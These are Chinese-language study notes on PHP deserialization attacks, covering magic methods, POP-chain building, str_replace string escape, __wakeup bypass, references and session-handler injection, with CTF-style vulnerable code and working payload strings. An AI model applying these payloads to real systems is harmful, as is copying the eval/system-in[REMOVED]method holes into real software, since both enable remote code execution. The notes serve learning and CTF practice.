&lt;?php	class Test&#123;		public $id;		private $name;		protected $sex;		public function __construct($id = null,$name = null,$sex = null)&#123;			$this-&gt;id = $id;			$this-&gt;name = $name;			$this-&gt;sex = $sex;		&#125;	&#125;	$a = new Test(123,&#x27;淳平&#x27;,&#x27;男&#x27;);	echo serialize($a).&quot;\n&quot;;	$str = &#x27;O:4:&quot;Test&quot;:3:&#123;s:2:&quot;id&quot;;i:123;s:10:&quot;%00Test%00name&quot;;s:6:&quot;淳平&quot;;s:6:&quot;%00*%00sex&quot;;s:3:&quot;男&quot;;&#125;&#x27;;//复制echo内容	$str = urldecode($str);	var_dump(unserialize($str));?&gt;/*object(Test)#2 (3) &#123;  [&quot;id&quot;]=&gt;  int(123)  [&quot;name&quot;:&quot;Test&quot;:private]=&gt;  string(6) &quot;淳平&quot;  [&quot;sex&quot;:protected]=&gt;  string(3) &quot;男&quot;&#125;*/

/**/&lt;?php	class Test&#123;		public $id;		private $name;		protected $sex;		public function __construct($id = null,$name = null,$sex = null)&#123;			$this-&gt;id = $id;			$this-&gt;name = $name;			$this-&gt;sex = $sex;		&#125;	&#125;	$a = new Test(123,&#x27;淳平&#x27;,&#x27;男&#x27;);	echo serialize($a).&quot;\n&quot;;	/*反序列化生成对象中成员变量的值，由提供给反序列化的序列化字符串中的值决定*/	$str = &#x27;O:4:&quot;Test&quot;:3:&#123;s:2:&quot;id&quot;;i:123;s:10:&quot;%00Test%00name&quot;;s:6:&quot;德川&quot;;s:6:&quot;%00*%00sex&quot;;s:3:&quot;男&quot;;&#125;&#x27;;	$str = urldecode($str);	var_dump(unserialize($str));?&gt;/*O:4:&quot;Test&quot;:3:&#123;s:2:&quot;id&quot;;i:123;s:10:&quot;�Test�name&quot;;s:6:&quot;淳平&quot;;s:6:&quot;�*�sex&quot;;s:3:&quot;男&quot;;&#125;object(Test)#2 (3) &#123;  [&quot;id&quot;]=&gt;  int(123)  [&quot;name&quot;:&quot;Test&quot;:private]=&gt;  string(6) &quot;德川&quot; 输出德川而不是最开始的淳平，因为更改了序列化字符串  [&quot;sex&quot;:protected]=&gt;  string(3) &quot;男&quot;&#125;*/

魔术方法魔术方法：在特定条件下自动触发的方法
触发前提：魔术方法所在的类或对象被调用

魔术方法必须掌握触发时机，参数，返回值

常见魔术方法

构造与析构/*构造触发时机:当new对象时自动调用（构造器）功能:初始化对象参数:非必要返回值:无*/function __construct(args...);/*析构触发时机:对象的所有引用被删除或对象被显式销毁时执行,反序列化之后执行,代码运行结束执行功能:参数:无返回值:无*/function __destruct();&lt;?phpclass Test&#123;	public $name;	public function __construct()&#123;		echo &#x27;构造函数&#x27;.&quot;\n&quot;;	&#125;	public function __destruct()&#123;		echo &#x27;析构函数&#x27;.&quot;\n&quot;;	&#125;&#125;$a = new Test();//触发__construct();$str  = serialize($a);$str1 = &#x27;O:4:&quot;Test&quot;:1:&#123;s:4:&quot;name&quot;;N;&#125;&#x27;;$f = unserialize($str1); //触发__destruct();?&gt;//触发__destruct();    /*结果构造函数析构函数析构函数*/

unserialize()触发析构函数是因为,反序列化是将原先实例销毁，再根据序列化字符串创建新对象
&lt;?phpclass Test&#123;	public $name;	public function __construct($name = null)&#123;		$this-&gt;name = $name;		echo &#x27;构造函数&#x27;.&quot;\n&quot;;	&#125;	public function __destruct()&#123;		echo &#x27;析构函数&#x27;.&quot;\n&quot;;	&#125;&#125;$a = new Test(&#x27;淳平&#x27;);$str  = serialize($a);$f = unserialize($str);//$a被销毁了echo $a-&gt;name;//这里会警告$a为null?&gt;

漏洞例题&lt;?phphighlight_file(__FILE__);error_reporting(0);class User&#123;	var $cmd = &quot;echo &#x27;dazhuang666!!&#x27;;&quot;;	public function __destruct()	&#123;		eval($this-&gt;cmd);//漏洞在这	&#125;&#125;$ser = $_GET[&quot;benben&quot;];unserialize($ser);//会在这调用__destruct()?&gt;

需要构造序列化字符串，将$cmd改成要执行的php命令
/*构造字符串*/$str = &#x27;O:4:&quot;User&quot;:1:&#123;s:3:&quot;cmd&quot;;s:20:&quot;echo &quot;Hello World!&quot;;&quot;;&#125;&#x27;;

构造url，拼接参数?benben=O:4:&quot;User&quot;:1:&#123;s:3:&quot;cmd&quot;;s:20:&quot;echo &quot;Hello World!&quot;;&quot;;&#125;到localhost/ser后
sleep先进行__sleep()再serialize()

function __sleep();/*返回要序列化的属性名的数组触发时机：执行serialize()之前功能：返回需要被序列化的成员参数：无返回值：包含需要被序列化的成员属性名的数组*/&lt;?phpclass User&#123;	public $name;	public $id;	private $password;	public function __construct($name = null,$id = null,$password = null)&#123;		$this-&gt;name = $name;		$this-&gt;id = $id;		$this-&gt;password = $password;	&#125;	public  function __sleep()&#123;		return array(&#x27;name&#x27;,&#x27;id&#x27;);//返回包含属性名的数组	&#125;	&#125;$a = new User(&#x27;淳平&#x27;,114514,&#x27;114514&#x27;);echo serialize($a);//结果中将不会有password-- - - - - -- - - - - - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - /*O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;淳平&quot;;s:2:&quot;id&quot;;i:114514;&#125;*/

例题&lt;?phphighlight_file(__FILE__);error_reporting(0);class User&#123;	const SITE = &#x27;uusama&#x27;;	public $username;	public $nickname;	private $password;	public function __construct($username, $nickname, $password)	&#123;		$this-&gt;username = $username;		$this-&gt;nickname = $nickname;		$this-&gt;password = $password;	&#125;	public function __sleep()	&#123;		system($this-&gt;username);//漏洞	&#125;&#125;$cmd = $_GET[&#x27;benben&#x27;];$user = new User($cmd, &#x27;b&#x27;, &#x27;c&#x27;);echo serialize($user);?&gt;

因为__sleep()在serialize()前执行,$cmd对应的就是$username，所以我们只需要把get请求的参数换成任意的命令就行
wakeup
function __wakeup();/*触发时机：unserialize()之前功能：参数：返回值：*/&lt;?phpclass User&#123;	public $name;	public $id;	private $password;	public function __construct($name = null,$id = null,$password = null)&#123;		$this-&gt;name = $name;		$this-&gt;id = $id;		$this-&gt;password = $password;	&#125;	public function __sleep()&#123;		return array(&#x27;name&#x27;,&#x27;id&#x27;);	&#125;	public function __wakeup()&#123;		$this-&gt;password = &#x27;114514&#x27;;//反序列化前调用，给password赋值	&#125;&#125;$str = &#x27;O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;淳平&quot;;s:2:&quot;id&quot;;i:114514;&#125;&#x27;;//没有passwordvar_dump(unserialize($str));//password有值了?&gt;/*object(User)#1 (3) &#123;  [&quot;name&quot;]=&gt;  string(6) &quot;淳平&quot;  [&quot;id&quot;]=&gt;  int(114514)  [&quot;password&quot;:&quot;User&quot;:private]=&gt;  string(6) &quot;114514&quot;&#125;*/

例题 &lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    const SITE = &#x27;uusama&#x27;;    public $username;    public $nickname;    private $password;    private $order;    public function __wakeup() &#123;        system($this-&gt;username);//漏洞    &#125;&#125;$user_ser = $_GET[&#x27;benben&#x27;];//需要构造一个含有username的序列化字符串unserialize($user_ser);?&gt;

思路:构造get参数为一个含有username的序列化字符串，username值为任意命令																		payload:  ?benben=O:4:&quot;User&quot;:1:&#123;s:8:&quot;username&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;
toString和invokefunction __toString();/*触发时机：把对象当作字符串调用;调用对象要使用var_dump()或print_r(),使用echo或print就会调用__toString()功能：参数：返回值：字符串*/function __invoke();/*触发时机：把对象当作方法(函数)调用功能：参数：返回值：字符串*/&lt;?phpclass User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null,$username = null,$password = null)&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __tostring()&#123;		return &#x27;这不是字符串!&#x27;;	&#125;	public function __invoke()&#123;		return &#x27;这不是方法!!&#x27;;	&#125;&#125;$a = new User(1,&#x27;a&#x27;,&#x27;c&#x27;);echo $a;//输出这不是字符串echo $a();//输出这不是方法?&gt;

错误调用相关魔术方法call
function __call($arg1,$arg2);/*触发时机:调用不存在的成员方法功能：参数:$arg1:方法名 $arg2:参数值的数组返回值:无*/&lt;?phpclass User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null,$username = null,$password = null)&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __call($arg1,$arg2)&#123;		echo $arg1.&quot;\n&quot;;		for($i = 0;$i &lt; count($arg2); ++$i)&#123;//把传进去的所有参数打印出来			echo $arg2[$i].&quot;\n&quot;;		&#125;	&#125;&#125;$a = new User();$a-&gt;test(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;);//会调用call()?&gt;/*testabc*/

callStatic
function __callStatic($arg1,$arg2);/*php中调用成员常量或静态调用: ::$arg1:方法名	$arg2:参数值的数组*/&lt;?phpclass User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null,$username = null,$password = null)&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public static function __callStatic($arg1,$arg2)&#123;		echo $arg1.&quot;\n&quot;;		for($i = 0;$i &lt; count($arg2); ++$i)&#123;			echo $arg2[$i].&quot;\n&quot;;		&#125;	&#125;&#125;$a = new User();$a::test(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;);?&gt;

get
&lt;?phperror_reporting(0);class User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null, $username = null, $password = null)	&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __get($arg1)	&#123;		echo $arg1;	&#125;&#125;$a = new User();$a-&gt;var2;?&gt;

set
&lt;?phperror_reporting(0);class User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null, $username = null, $password = null)	&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __set($arg1,$arg2)&#123;		echo $arg1.$arg2;	&#125;&#125;$a = new User();$a-&gt;var2 = &#x27;111&#x27;;//会输出var2111?&gt;

isset
/*arg1就是不可访问变量的属性名*/&lt;?phperror_reporting(0);class User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null, $username = null, $password = null)	&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __isset($arg1)&#123;		echo $arg1;	&#125;&#125;$a = new User();isset($a-&gt;password);//私有成员不可访问empty($a-&gt;password);?&gt;

unset
clone
&lt;?phperror_reporting(0);class User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null, $username = null, $password = null)	&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __clone()&#123;		echo &#x27;cloned!&#x27;;	&#125; &#125;$a = new User();$b = clone($a);//输出cloned!?&gt;

总结表

pop链前置知识 &lt;?phphighlight_file(__FILE__);error_reporting(0);class index &#123;    private $test;    public function __construct()&#123;        $this-&gt;test = new normal();    &#125;    public function __destruct()&#123;        $this-&gt;test-&gt;action();    &#125;&#125;class normal &#123;    public function action()&#123;        echo &quot;please attack me&quot;;    &#125;&#125;class evil &#123;    var $test2;    public function action()&#123;        eval($this-&gt;test2);//&lt;-漏洞    &#125;&#125;unserialize($_GET[&#x27;test&#x27;]);?&gt;

反推法1.先找漏洞在哪，eval()函数处有漏洞2.eval调用evil的$test23.但是单单unserialize()并不会调用evil的action()4.unserialize()会调用__destruct()5.但是__destruct()中的$test是normal的实例6.要想办法构造序列化字符串使index中的$test变成evil的实例

构造序列化字符串
方法1:直接改代码加注释，在类里赋值，让php帮忙跑出想要的序列化字符串
&lt;?php// highlight_file(__FILE__);error_reporting(0);class index&#123;	private $test;	public function __construct()	&#123;		$this-&gt;test = new evil();	&#125;	// public function __destruct()	// &#123;	// 	$this-&gt;test-&gt;action();	// &#125;&#125;// class normal// &#123;// 	public function action()// 	&#123;// 		echo &quot;please attack me&quot;;// 	&#125;// &#125;class evil&#123;	var $test2 = &#x27;echo &quot;Hello World!&quot;;&#x27;;	// public function action()	// &#123;	// 	eval($this-&gt;test2);	// &#125;&#125;// unserialize($_GET[&#x27;test&#x27;]);echo urlencode(serialize(new index()));?&gt;

方法2:在类外进行赋值
&lt;?phphighlight_file(__FILE__);error_reporting(0);class index&#123;	public $test;//偷偷改成public，如果是private就只能用第一种方式&#125;class evil&#123;	var $test2;&#125;$a = new evil();$a-&gt;test2 = &#x27;system(&quot;ls&quot;)&#x27;;$b = new index();$b-&gt;test = $a;echo serialize($b);?&gt;

魔术方法触发规则触发前提：魔术方法所在的类或对象被调用
eg:
 &lt;?phphighlight_file(__FILE__);error_reporting(0);class fast &#123;    public $source;    public function __wakeup()&#123;        echo &quot;wakeup is here!!&quot;;        echo  $this-&gt;source;//如果要触发toString(),这里的source就得是sec的对象    &#125;&#125;class sec &#123;    var $benben;    public function __tostring()&#123;        echo &quot;tostring is here!!&quot;;    &#125;&#125;$b = $_GET[&#x27;benben&#x27;];unserialize($b);?&gt;

目标:显示tostring is here!!

//生成序列化字符串的url编码&lt;?phperror_reporting(0);class fast&#123;	public $source;&#125;class sec&#123;	var $benben;&#125;$a = new fast();$b = new sec();$a-&gt;source = $b;echo urlencode(serialize($a));//输出O%3A4%3A%22fast%22%3A1%3A%7Bs%3A6%3A%22source%22%3BO%3A3%3A%22sec%22%3A1%3A%7Bs%3A6%3A%22benben%22%3BN%3B%7D%7D?&gt;

构造url,?benben=O%3A4%3A%22fast%22%3A1%3A%7Bs%3A6%3A%22source%22%3BO%3A3%3A%22sec%22%3A1%3A%7Bs%3A6%3A%22benben%22%3BN%3B%7D%7D
先执行wakeup()再执行toString()
POP链构造与POC编写
eg:
 &lt;?php//flag is in flag.phphighlight_file(__FILE__);error_reporting(0);class Modifier &#123;    private $var;    public function append($value)    &#123;        include($value);        echo $flag;//1.目的要输出$flag    &#125;    public function __invoke()&#123;//2.触发__invoke()调用append()并把$var设置成flag.php        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __toString()&#123;        return $this-&gt;str-&gt;source;//4.如果把$str赋值为Test，Test中没有source成员，就会触发__get()    &#125;    public function __wakeup()&#123;//6.最终unserialize()触发__wakeup()        echo $this-&gt;source;//5.触发toString(),把自己作为变量赋值给$source    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();//3.如果把$p变成Modifier,调用__get()就会触发Modifier的__invoke()    &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123;    unserialize($_GET[&#x27;pop&#x27;]);&#125;?&gt; 

第一步：触发invoke，使$var = &#39;flag.php&#39;
第二步：触发get，给$p赋值为对象Modifier
第三步：触发toString，给$str赋值为对象Test
第四步：触发wakeup，给source赋值为自己的对象
因为wakeup在Show中，所以我们构造序列化字符串中传递的参数就是Show
&lt;?php//flag is in flag.php// highlight_file(__FILE__);error_reporting(0);class Modifier &#123;    private $var = &#x27;flag.php&#x27;;//私有属性就不能在外赋值了&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $p;&#125;$a  = new Modifier();$b = new Show();$c = new Test();$b-&gt;source = $b;$b-&gt;str = $c;$c-&gt;p = $a;echo urlencode(serialize($b));?&gt; 

把url编码后的序列化字符串作为参数传入?pop=
得到flag：&#96;&#96; ctfstu&#123;5c202c62-7567-4fa0-a370-134fe9d16ce7&#125;

字符串逃逸利用str_replace()
/** * @param array|string $search 要被替换的 * @param array|string $replace 要替换的 * @param array|string $subject 替换的对象 * @return void */function str_replace(array|string $search, array|string $replace, array|string $subject);


反序列化时，属性长度不对，成员数量不对都无法进行序列化，会显示bool(false)
&lt;?phperror_reporting(0);class Test&#123;	public $a;	public $b;&#125;$a=new Test();// echo serialize($a);// $ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;$ser_str = &#x27;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;//成员数量不对var_dump(unserialize($ser_str));?&gt;&lt;!--bool(false)--&gt;&lt;?phperror_reporting(0);class Test&#123;	public $a;    public $b;&#125;$a=new Test();// echo serialize($a);// $ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;$ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1111:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;//长度不对var_dump(unserialize($ser_str));?&gt;&lt;!--bool(false)--&gt;

如果反序列化时，忽略了某个存在的变量，序列化字符串中加上新的变量，最终反序列化结果会包含被忽略的变量和序列化字符串中的变量
&lt;?phperror_reporting(0);class Test&#123;	public $a;	public $b;&#125;$a=new Test();// echo serialize($a);// $ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;$ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;c&quot;;N;&#125;&#x27;;var_dump(unserialize($ser_str));?&gt;&lt;!--object(Test)#2 (3) &#123;  [&quot;a&quot;]=&gt;  NULL  [&quot;b&quot;]=&gt;  NULL  [&quot;c&quot;]=&gt;  NULL&#125;&gt;

为什么长度一定不能错?

/*反序列化结束符为;&#125;*/&lt;?phperror_reporting(0);class Test&#123;	public $a;	public $b;	public $c = &#x27;c&#x27;;&#125;$a = new Test();$ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;s:1:&quot;c&quot;;&quot;ccc&quot;;&#125;&#x27;;var_dump(unserialize($ser_str));/*object(Test)#2 (3) &#123;  [&quot;a&quot;]=&gt;  NULL  [&quot;b&quot;]=&gt;  NULL  [&quot;c&quot;]=&gt;  string(1) &quot;c&quot;&#125;*/?&gt;

减少
&lt;?phpclass Test&#123;	public $a;	public $b = &#x27;abcsystem&#x27;;	public $c;&#125;$str = serialize(new Test());/*$str = &#x27;O:4:&quot;Test&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;s:9:&quot;abcsystem&quot;;s:1:&quot;c&quot;;N;&#125;&#x27;*/$str = str_replace(&#x27;system&#x27;,&quot;&quot;,$str);/*$str = &#x27;O:4:&quot;Test&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;s:9:*/&quot;abc&quot;;s:1:&quot;&quot;/*&quot;c&quot;;N;&#125;&#x27;*/ //没注释的地方是会被当成$b的值的地方var_dump(unserialize($str));?&gt;



就是构造成员变量的值，在str_replace()的时候，能刚好吃掉不想要的，能够构造我们的命令
先把我们要执行的命令写好，这样便于构造长度
//eg&lt;?phpclass Test&#123;	public $a = &#x27;abcsystem&#x27;;	public $b = &#x27;构造的表达式&#x27;;&#125;$str = serialize(new Test());echo &quot;$str\n&quot;;&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;abcsystem&quot;;s:1:&quot;b&quot;;s:?:&quot;构造的表达式&quot;;&#125;&#x27;;//要吃到构造的表达式所处的第一个&quot;?&gt;/*19个字符要3个system*/&lt;?phpclass Test&#123;	public $a = &#x27;abcsystemsystemsystem&#x27;;	public $b = &#x27;12&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;&#x27;;//用;&#125;直接截断&#125;$str = serialize(new Test());echo &quot;$str\n&quot;;&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:21:&quot;abcsystemsystemsystem&quot;;s:1:&quot;b&quot;;s:37:&quot;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;&quot;;&#125;&#x27;;//截到构造的表达式前只有19个字符，还要再在构造的表达式前补上2个字符(21 - 19 = 2)和&quot;;$str = str_replace(&#x27;system&#x27;,&#x27;&#x27;,$str);$str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:21:&quot;abc&quot;;s:1:&quot;b&quot;;s:37:&quot;12&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;&quot;;&#125;&#x27;;var_dump(unserialize($str));?&gt;  /*object(Test)#1 (2) &#123;  [&quot;a&quot;]=&gt;  string(21) &quot;abc&quot;;s:1:&quot;b&quot;;s:37:&quot;12&quot;  [&quot;b&quot;]=&gt;  string(20) &quot;echo &quot;hello world!&quot;;&quot;&#125;*/

例题&lt;?phperror_reporting(0);function filter($name)&#123;	$safe = array(&quot;flag&quot;, &quot;php&quot;);	$name = str_replace($safe, &quot;hk&quot;, $name);	return $name;&#125;class test&#123;	var $user;	var $pass;	var $vip = false;	function __construct($user, $pass)	&#123;		$this-&gt;user = $user;		$this-&gt;pass = $pass;	&#125;&#125;$param = $_GET[&#x27;user&#x27;];$pass = $_GET[&#x27;pass&#x27;];$param = serialize(new test($param, $pass));$profile = unserialize(filter($param));if ($profile-&gt;vip) &#123;	echo file_get_contents(&quot;flag.php&quot;);&#125;?&gt;

思路,三个属性,构造第一个属性,使它能吃掉剩下属性的值,在第二个属性中构造表达式使vip=true
&lt;?phpclass test&#123;	var $user = &quot;php&quot;;	var $pass = &quot;&quot;;	var $vip;&#125;echo serialize(new test());?&gt;//O:4:&quot;test&quot;:3:&#123;s:4:&quot;user&quot;;s:3:&quot;php&quot;;s:4:&quot;pass&quot;;s:0:&quot;&quot;;s:3:&quot;vip&quot;;N;&#125;/*从user值吃到pass值的前一个&quot;,需要18个字符(除去最开始的php),php经过filter变成hk减少一个字符,一共需要18个php才能正确吃完让$user = 18个php让$pass = &quot;;s:4:&quot;pass&quot;;N;s:3:&quot;vip&quot;;b:1;&#125;构造url,得到flag*/


增多
用str_replace(),替换成一个更长的字符串，把多余的字符吐出来
&lt;?phpclass Test&#123;	public $a = &#x27;a&#x27;;	public $b = &#x27;b&#x27;;&#125;$a = new Test();$str = serialize($a);//&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#x27;;$str = str_replace(&#x27;a&#x27;,&#x27;aaa&#x27;,$str);// echo &quot;$str\n&quot;;/*&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a*/aa/*&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#x27;;*/ //多出来的aa就是吐出的多余代码?&gt;

思路：把吐出来的多余代码构造成功能性代码
构造的字符串:&quot;;s:1:&quot;b&quot;:s:?:&quot;&quot;;&#125;   用;&#125;结束反序列化，不用管原功能性代码
构造的字符串长度为x，将ls替换成pwd会吐一个字符出来，需要x个pwd，这样就能吐x个字符出来，与前面长度正确对应，功能性代码被正确吐出

class Test&#123;	public $a = &#x27;ls&#x27;;	public $b = &#x27;b&#x27;;&#125;$a = new Test();echo serialize($a).&quot;\n&quot;;?&gt;/*想构造一个显示hello world,构造字符串&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125; 长度为39将ls用pwd替换,吐出一个字符,所以我们需要39个ls,替换后才能吐出39个字符,让功能性代码正确吐出*/&lt;?phpclass Test&#123;	public $a = &#x27;lslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslsls&#x27;;//39个ls	public $b = &#x27;b&#x27;;&#125;$a = new Test();$hacker = &#x27;&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;&#x27;;$a-&gt;a = $a-&gt;a.$hacker;$str = serialize($a);echo &quot;$str\n&quot;;$str = str_replace(&#x27;ls&#x27;,&#x27;pwd&#x27;,$str);echo &quot;$str\n&quot;;// &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:114:&quot;pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#x27;;var_dump(unserialize($str));?&gt;

例题&lt;?php// highlight_file(__FILE__);error_reporting(0);function filter($name)&#123;	$safe = array(&quot;flag&quot;, &quot;php&quot;);	$name = str_replace($safe, &quot;hack&quot;, $name);	return $name;&#125;class test&#123;	var $user;	var $pass = &#x27;daydream&#x27;;	function __construct($user)	&#123;		$this-&gt;user = $user;	&#125;&#125;$param = $_GET[&#x27;param&#x27;];$param = serialize(new test($param));$profile = unserialize(filter($param));if ($profile-&gt;pass == &#x27;escaping&#x27;) &#123;	echo file_get_contents(&quot;flag.php&quot;);&#125;?&gt;

目标:判断pass是否为escaping;用filter将php换成hack达到字符串增多
目标逃逸代码:&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;,29个字符,所以需要29个php
构造参数?param=phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp%22%3Bs%3A4%3A%22pass%22%3Bs%3A8%3A%22escaping%22%3B%7D
得到flag

wakeup魔术方法绕过
例题 &lt;?phperror_reporting(0);class secret&#123;    var $file=&#x27;index.php&#x27;;    public function __construct($file)&#123;        $this-&gt;file=$file;    &#125;    function __destruct()&#123;        include_once($this-&gt;file);        echo $flag;    &#125;    function __wakeup()&#123;        $this-&gt;file=&#x27;index.php&#x27;;    &#125;&#125;$cmd=$_GET[&#x27;cmd&#x27;];if (!isset($cmd))&#123;    highlight_file(__FILE__);&#125;else&#123;    if (preg_match(&#x27;/[oc]:\d+:/i&#x27;,$cmd))&#123;        echo &quot;Are you daydreaming?&quot;;    &#125;    else&#123;        unserialize($cmd);    &#125;&#125;//sercet in flag.php?&gt;

分析:要绕过__wakeup(),O:后面不能跟数字以绕过正则表达式
&lt;?phpclass secret&#123;	var $file = &#x27;flag.php&#x27;;&#125;echo serialize(new secret()).&quot;\n&quot;;//获取原序列化字符串echo urlencode(&#x27;O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#x27;);//在数字前加上+绕过正则表达式,把属性数改大绕过wakeup?&gt;

拿到flag

引用php中引用为 &amp;
&lt;?phpclass Test&#123;	public $a;	public $b;&#125;$test = new Test();$test-&gt;a = &amp;$test-&gt;b; // a是b的引用echo serialize($test).&quot;\n&quot;;/*O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;&#125;*/?&gt;



例题&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);class just4fun &#123;    var $enter;    var $secret;&#125;if (isset($_GET[&#x27;pass&#x27;])) &#123;    $pass = $_GET[&#x27;pass&#x27;];    $pass=str_replace(&#x27;*&#x27;,&#x27;\*&#x27;,$pass);&#125;$o = unserialize($pass);if ($o) &#123;    $o-&gt;secret = &quot;*&quot;;    if ($o-&gt;secret === $o-&gt;enter)        echo &quot;Congratulation! Here is my secret: &quot;.$flag;    else        echo &quot;Oh no... You can&#x27;t fool me&quot;;&#125;else echo &quot;are you trolling?&quot;;?&gt;


这题中传入引用即可
&lt;?php// highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);class just4fun &#123;    var $enter;    var $secret;&#125;$a = new just4fun();$a-&gt;enter = &amp;$a-&gt;secret;echo serialize($a);?&gt;


session反序列化漏洞一个页面写入session，一个页面读出session





例题no.1
//写入session &lt;?phphighlight_file(__FILE__);error_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;ben&#x27;] = $_GET[&#x27;a&#x27;];?&gt; 

//读出session&lt;?php highlight_file(__FILE__);error_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);session_start();class D&#123;    var $a;    function __destruct()&#123;        eval($this-&gt;a);//漏洞所在    &#125;&#125;?&gt; 

以php_serialize方式写入,以php方式读出,php方式键名|序列化字符串,所以构造参数时要加|
构造参数 ?a=|O:1:&quot;D&quot;:1:&#123;s:1:&quot;a&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;
no.2
//写入session &lt;?phphighlight_file(__FILE__);error_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;a&#x27;] = $_GET[&#x27;a&#x27;];?&gt; 

//读出session&lt;?phphighlight_file(__FILE__);/*hint.php*/session_start();class Flag&#123;    public $name;    public $her;    function __wakeup()&#123;        $this-&gt;her=md5(rand(1, 10000));        if ($this-&gt;name===$this-&gt;her)&#123;            include(&#x27;flag.php&#x27;);            echo $flag;        &#125;    &#125;&#125;?&gt; 

分析:需要用到引用,以php_serialize方式写入session,php方式读出
构造参数?a=|O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;;
phar反序列化漏洞

重点关注manifest这个字段
manifest字段格式

24byte后是序列化的字符串
漏洞原理
例题no.1
